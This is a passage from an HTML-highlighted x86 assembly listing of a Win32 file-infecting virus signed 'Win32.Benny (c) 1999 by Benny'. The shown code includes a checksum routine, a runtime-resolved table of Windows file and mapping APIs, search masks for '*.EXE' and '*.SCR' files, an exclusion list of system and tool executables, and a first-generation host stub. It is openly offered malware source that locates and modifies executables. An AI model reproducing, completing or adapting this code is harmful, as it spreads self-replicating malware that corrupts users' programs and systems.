    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_byte</span><span class="sc0">                   </span><span class="sc1">;read 8 bytes</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;add LSD + CF to LSD</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;invert LSD</span><span class="sc0">
</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">;rotate LSD LSB times</span><span class="sc0">
    </span><span class="sc6">jp</span><span class="sc0"> </span><span class="sc5">@2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_rotate</span><span class="sc0">                 </span><span class="sc1">;rotate LSD and MSD</span><span class="sc0">
</span><span class="sc5">@2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">crc_msd</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">;sub LSD with MSD + CF</span><span class="sc0">
</span><span class="sc5">crc_msd</span><span class="sc4">:</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;sub MSD with MSD + CF</span><span class="sc0">
    </span><span class="sc6">jnp</span><span class="sc0"> </span><span class="sc5">@3</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;invert MSD</span><span class="sc0">
</span><span class="sc5">@3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;xor MSD with LSD</span><span class="sc0">
    </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">@4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_rotate</span><span class="sc0">                 </span><span class="sc1">;rotate LSD and MSD</span><span class="sc0">
</span><span class="sc5">@4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">crc_loop</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;add LSD to MSD + CF</span><span class="sc0">
</span><span class="sc5">crc_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jp</span><span class="sc0"> </span><span class="sc5">next_loop</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_swap</span><span class="sc0">                   </span><span class="sc1">;swap bytes in LSD and MSD</span><span class="sc0">
</span><span class="sc5">next_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;decrement LSD</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;increment MSD</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">make_crc</span><span class="sc0">                   </span><span class="sc1">;until ecx = 1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;restore regs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">crc_byte</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;read 8 bytes from source</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">;load 4 bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;ebx = new 4 bytes</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">;load next 4 bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;edi = new 4 bytes</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">7</span><span class="sc0">                 </span><span class="sc1">;correct ecx for loop</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">crc_rotate</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;rotate LSD and MSD</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;xor MSD with LSD</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;count of rotations</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                 </span><span class="sc1">;rotate LSD</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">;xor LSD with MSD</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;count of rotations</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                 </span><span class="sc1">;rotate MSD</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">crc_swap</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;swap bytes in LSD and MSD</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">                 </span><span class="sc1">;swap LSD and MSD lower bytes</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">                 </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                 </span><span class="sc1">;get highest bytes</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                 </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">                 </span><span class="sc1">;swap LSD and MSD higher bytes</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">                 </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">;and swap LSD with MSD</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Win32.Benny (c) 1999 by Benny'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;my mark</span><span class="sc0">
</span><span class="sc5">Checksum64</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc5">OrigEPoint</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">MyGetModuleHandleA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetModuleHandleA</span><span class="sc0">

</span><span class="sc5">Virus_End</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">MyGetVersion</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyIsDebuggerPresent</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyCreateFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyFindFirstFileA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyFindNextFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyFindClose</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MySetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyCloseHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyCreateFileMappingA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyMapViewOfFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyUnmapViewOfFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MySetFilePointer</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MySetEndOfFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MySetFileTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyGetWindowsDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyGetSystemDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">MyGetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">v_strings</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">vszKernel32</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszGetModuleHandleA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">f_names</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">vszGetVersion</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetVersion'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszIsDebuggerPresent</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'IsDebuggerPresent'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszCreateFileA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszFindFirstFileA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszFindNextFileA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszFindClose</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszSetFileAttributesA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszCloseHandle</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszCreateFileMappingA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszMapViewOfFile</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszUnmapViewOfFile</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszSetFilePointer</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszSetEndOfFile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszSetFileTime</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszGetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszGetSystemDirectoryA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszGetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">vszExe</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszScr</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.SCR'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">vszNamez</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'NTVDM.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RUNDLL32.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'TD32.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'TLINK32.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'TASM32.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">PathName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">WindowsPath</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">Win32_Find_Data</span><span class="sc0">     </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">SearchHandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">hMapFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lpFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Virtual_End</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_GetModuleHandleA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">


</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
</span><span class="sc5">exit_h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">Msg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'First generation of Win32.Benny'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Start_Virus</span><span class="sc0">
</span></div></body>
</html>
